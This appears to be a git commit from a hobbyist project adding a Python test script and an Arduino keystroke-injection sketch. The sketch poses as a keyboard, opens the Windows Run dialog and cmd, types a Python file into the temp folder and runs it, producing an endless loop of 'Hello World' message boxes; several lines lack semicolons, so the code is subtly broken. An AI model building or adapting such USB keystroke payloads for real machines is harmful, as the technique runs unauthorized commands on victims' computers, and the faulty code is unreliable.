295d71038c95575dcdd322eaab9333d7e720bff2
poliernus <polmeca@gmail.com>
2024-06-22 00:39:50 +0200

    un try de payload q abre una window

---
+++ windowPayload/test.py
@@ -0,0 +1,7 @@
+from tkinter import messagebox
+def hello():
+   messagebox.showinfo("Say Hello", "Hello World")
+
+while True:
+    hello()
+
---
+++ windowPayload/windowPayload.ino
@@ -0,0 +1,79 @@
+/*
+ * Keep in mind this payload is made to stop it with a button in pin 3 to stop the payload to execute <3
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+    pinMode(3, INPUT_PULLUP);
+    if (digitalRead(3) == LOW){
+        while(1);
+    }
+  // Begining the Keyboard stream
+  // The keyboard is set to spanish!!!
+  Keyboard.begin(KeyboardLayout_es_ES);
+
+
+  delay(3500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+
+  Keyboard.print("cmd");
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  Keyboard.print("cd %tmp% && copy con whatToDo.py");
+  
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("from tkinter import messagebox");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("def hello():")
+  
+  typeKey(KEY_RETURN);
+
+   Keyboard.print('messagebox.showinfo("Say Hello", "Hello World")')
+  
+  typeKey(KEY_RETURN);
+
+   Keyboard.print("while True:")
+  
+  typeKey(KEY_RETURN);
+
+   Keyboard.print("hello()")
+  
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("whatToDo.py");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.end();
+}
+void loop() {}
+
+
